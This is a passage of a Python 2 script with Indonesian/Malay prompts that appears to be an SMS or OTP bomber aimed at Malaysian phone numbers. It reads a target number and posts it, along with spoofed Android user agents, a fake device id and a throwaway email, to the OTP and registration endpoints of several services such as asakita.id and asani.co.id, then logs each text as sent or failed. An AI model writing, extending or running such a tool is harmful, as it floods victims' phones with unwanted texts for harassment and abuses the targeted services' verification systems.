...
def input():
  ...
  if len(nom) < 5:
    ...
    input()
  elif nom.startswith(tuple(["60","+60","0"])):
    print "%s[%s!%s] %sMasukkan nomor tanpa 60, +60, ataupun 0\n%s[%s!%s] %sContoh : 0123456789"%(pu,me,pu,ku,pu,me,pu,ku)
    input()
  else:
    global jum
...
def asakita():
  ...
  h = requests.post("https://www.asakita.id/api/auth/register/otp",headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9; huawei 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'},data=data).text
  if 'MOBILE' in h:
   sukses("1","sms","asakita")
  else:
   gagal("1","sms","asakita")
def sunchila():
#  hih = requests.get("https://m.sunchila.com/api/generateAuthCode.ajax?mobile=0"+nom+"&countryCode=60")
...
def asani():
  j = requests.post("https://api.asani.co.id/api/v1/send-otp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=json.dumps({"phone":"60"+nom,"email":"akuntesnuyul@gmail.com"}))
...
def bocil():
 dat={'user_id':'','language':'in','phone':'60'+nom,'device_id':'590bc36d99d6dddb','retry':'0'}
...
def temanprima():
# dat=json.dumps({"phone":"60"+nom,"place":"google","phone_brand":"vivo","phone_model":"vivo 1902","device_id":"590bc36d99d6dddb"})
